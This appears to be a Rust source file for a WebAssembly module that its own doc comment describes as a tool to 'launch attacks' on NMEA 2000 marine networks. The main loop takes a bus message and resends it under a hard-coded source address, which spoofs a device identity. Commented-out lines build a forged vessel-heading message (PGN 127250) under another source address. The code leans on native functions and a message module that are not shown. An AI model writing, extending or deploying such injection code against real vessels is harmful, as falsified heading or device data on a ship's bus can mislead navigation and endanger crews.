#![warn(missing_docs)]

//! # nmea_attack
//!
//! A libary design to be compiled as a WebAssembley (wasm) app used to launch attacks on a NMEA 2000 network



// Modules
mod nmea_msg;
mod native_functions;

use nmea_msg::NMEAMsg;

/// Points to a message requested from the native read queue
static mut MSG_PTR: *const u8 = std::ptr::null();

/// links MSG_PTR to the buffer allocated for the wasm app
///
/// Sets MSG_PTR to the allocated wasm buffer so that when the native code updates the buffer, the updates can be accessed from within this app. 
/// This function is called from the native code before the main() function is executed. 
#[no_mangle]
pub extern "C" fn link_msg_buffer(char_arr: *const u8, _char_array_size: i32 ){
    unsafe {
        MSG_PTR = char_arr;
    }
}


/// Main execution loop
///
/// Called from native code as a pthread. Reads messages from MSG_PTR, modifies certain messages, and send messages out on the appropriate send queue. 
#[no_mangle]
fn main() {

    let mut msg = NMEAMsg::default();

    unsafe{
        msg = nmea_msg::chars_to_nmea(MSG_PTR,nmea_msg::MAX_DATA_LENGTH_BYTES);
        native_functions::SendMsg(msg.controller_num as i32, msg.priority as i32, msg.pgn as i32, 14 as i32, msg.data.as_ptr(), msg.data_length_bytes as i32);
        //let mut msg1 = NMEAMsg::default();
        //msg1.controller_num = 0;
        //msg1.priority = 3;
        //msg1.pgn = 127250;
        //msg1.source = 13;
        //msg1.data = [0; 223 as usize];
        //msg1.data_length_bytes = 3;
        //native_functions::SendMsg(msg1.controller_num as i32, msg1.priority as i32, msg1.pgn as i32, 12 as i32, msg1.data.as_ptr(), msg1.data_length_bytes as i32);
        
    }
   

}
